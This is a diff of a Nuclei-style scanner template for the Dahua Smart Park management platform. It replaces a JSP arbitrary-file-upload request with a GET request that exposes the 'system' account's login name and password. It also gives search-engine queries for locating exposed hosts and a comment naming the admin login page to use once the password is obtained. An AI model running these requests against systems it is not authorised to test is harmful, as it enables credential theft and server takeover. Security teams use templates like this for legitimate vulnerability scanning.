@@ -1,43 +1,31 @@
 id: Dahua
 
 info:
-  name: Dahua Smart Park Comprehensive Management Platform Video Arbitrary File Upload Vulnerability
+  name: Dahua Smart Park Comprehensive Management Platform User_ GetUserInfoByUserName.action Account Password Disclosure Vulnerability
   author: Zero Trust Security Attack and Defense Laboratory
-  severity: high
+  severity: medium
   description: |
-    There is an arbitrary file upload vulnerability in the video interface of Dahua Smart Park Comprehensive Management Platform, which allows attackers to upload arbitrary files to the server and control server permissions
+    Dahua Smart Park Comprehensive Management Platform User_ API interface exists in getUserInfoByUserName.action, which leads to password leakage of the management park account
   metadata:
     fofa-query: app="dahua-智慧园区综合管理平台"
     hunter-query: web.body="/WPMS/asset/lib/json2.js"
 
 http:
-  - raw:
-      - |
-          POST /publishing/publishing/material/file/video HTTP/1.1
-          Host: {{Hostname}}
-          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
-          Content-Length: 804
-          Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
-          Accept-Encoding: gzip, deflate
-          Connection: close
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"
 
-          --dd8f988919484abab3816881c55272a7
-          Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"
-
-          Test
-          --dd8f988919484abab3816881c55272a7
-          Content-Disposition: form-data; name="Submit"
-
-          submit
-          --dd8f988919484abab3816881c55272a7--
-      
-    req-condition: true
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 200'
-          - 'contains(body_1, "success")'
-          - 'contains(body_1, "path")'
-        condition: and
+      - type: word
+        part: body
+        words:
+          - "loginName"
+          - "loginPass"
 
-# /publishingImg/VIDEO/230812152005170200.jsp
+      - type: status
+        status:
+          - 200
+
+# 获取后访问地址
+# /admin/login_login.action
